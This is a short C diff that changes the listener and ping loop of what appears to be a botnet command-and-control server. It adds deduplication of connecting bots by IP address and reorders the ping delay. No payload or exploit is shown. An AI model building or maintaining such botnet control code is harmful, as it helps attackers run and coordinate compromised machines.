@@ -65,13 +65,23 @@ void* bot_listener(void* arg) {
     listen(bot_server_socket, MAX_BOTS);
 
     while (1) {
-        int bot_socket = accept(bot_server_socket, NULL, NULL);
+        struct sockaddr_in addr;
+        socklen_t addrlen = sizeof(addr);
+        int bot_socket = accept(bot_server_socket, (struct sockaddr*)&addr, &addrlen);
         setsockopt(bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
 
         pthread_mutex_lock(&bot_mutex);
-        if (bot_count < MAX_BOTS) {
+        int duplicate = 0;
+        for (int i = 0; i < bot_count; i++) {
+            if (bots[i].address.sin_addr.s_addr == addr.sin_addr.s_addr) {
+                duplicate = 1;
+                break;
+            }
+        }
+        if (!duplicate && bot_count < MAX_BOTS) {
             bots[bot_count].socket = bot_socket;
             bots[bot_count].is_valid = 0;
+            bots[bot_count].address = addr;
             pthread_t bot_thread;
             int *arg = malloc(sizeof(int));
             *arg = bot_socket;
@@ -87,13 +97,13 @@ void* bot_listener(void* arg) {
 
 void* ping_bots(void* arg) {
     while (1) {
-        sleep(1); 
         pthread_mutex_lock(&bot_mutex);
         for (int i = 0; i < bot_count; i++) {
             send(bots[i].socket, "ping", strlen("ping"), 0);
             bots[i].is_valid = 0; 
         }
         pthread_mutex_unlock(&bot_mutex);
+        sleep(1);
     }
     return NULL;
 }
